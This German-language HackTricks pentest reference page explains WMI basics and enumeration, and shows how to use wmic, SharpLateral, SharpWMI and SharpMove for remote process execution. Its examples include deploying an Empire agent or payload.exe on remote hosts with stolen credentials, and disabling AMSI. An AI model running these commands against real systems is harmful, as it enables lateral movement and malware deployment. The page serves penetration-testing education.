# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Erklärung der Funktionsweise

Prozesse können auf Hosts geöffnet werden, wenn der Benutzername sowie entweder das Passwort oder der Hash bekannt sind. Dies erfolgt mithilfe von WMI. Befehle werden von Wmiexec über WMI ausgeführt und bieten eine semi-interaktive Shell-Erfahrung.

**dcomexec.py:** Mithilfe verschiedener DCOM-Endpunkte bietet dieses Script eine semi-interaktive Shell ähnlich wie wmiexec.py und nutzt dabei speziell das ShellBrowserWindow-DCOM-Objekt. Derzeit werden MMC20. Application-, Shell Windows- und Shell Browser Window-Objekte unterstützt. (Quelle: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>

## WMI-Grundlagen

### Namespace

WMI ist in einer Verzeichnishierarchie strukturiert. Der Container der obersten Ebene ist \root, unter dem zusätzliche Verzeichnisse organisiert sind, die als Namespaces bezeichnet werden.<sup>[[1]](#references)</sup>
Befehle zum Auflisten von Namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klassen innerhalb eines Namespace können mit Folgendem aufgelistet werden:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klassen**

Den Namen einer WMI-Klasse, beispielsweise `win32_process`, sowie den Namespace, in dem sie sich befindet, zu kennen, ist für jede WMI-Operation entscheidend.  
Befehle zum Auflisten von Klassen, die mit `win32` beginnen:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Aufruf einer Klasse:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Methoden

Methoden, bei denen es sich um eine oder mehrere ausführbare Funktionen von WMI-Klassen handelt, können ausgeführt werden.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI-Dienststatus

Befehle zur Überprüfung, ob der WMI-Dienst betriebsbereit ist:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### System- und Prozessinformationen

Sammeln von System- und Prozessinformationen über WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Für Angreifer ist WMI ein leistungsfähiges Tool zur Aufzählung sensibler Daten über Systeme oder Domänen.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Remote-Abfragen von WMI nach bestimmten Informationen, beispielsweise lokalen Administratoren oder angemeldeten Benutzern, sind bei sorgfältiger Erstellung der Befehle möglich.

### **Manuelle Remote-WMI-Abfragen**

Eine unauffällige Identifizierung lokaler Administratoren auf einem Remote-Rechner und angemeldeter Benutzer kann durch spezifische WMI-Abfragen erreicht werden. `wmic` unterstützt auch das Lesen aus einer Textdatei, um Befehle gleichzeitig auf mehreren Knoten auszuführen.<sup>[[1]](#references)</sup>

Um einen Prozess remote über WMI auszuführen, beispielsweise zum Bereitstellen eines Empire-Agenten, wird die folgende Befehlsstruktur verwendet. Eine erfolgreiche Ausführung wird durch den Rückgabewert „0“ angezeigt:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Dieser Prozess veranschaulicht die Fähigkeit von WMI zur Remote-Ausführung und Systemaufzählung und hebt seine Nützlichkeit sowohl für die Systemadministration als auch für pentesting hervor.

## Automatische Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Du könntest auch **Impackets `wmiexec`** verwenden.


## Referenzen

- [1] [Mit Credentials Windows-Rechner übernehmen – Teil 3 (WMI und WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Anfängerleitfaden für das Impacket Tool Kit – Teil 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)


{{#include ../../banners/hacktricks-training.md}}
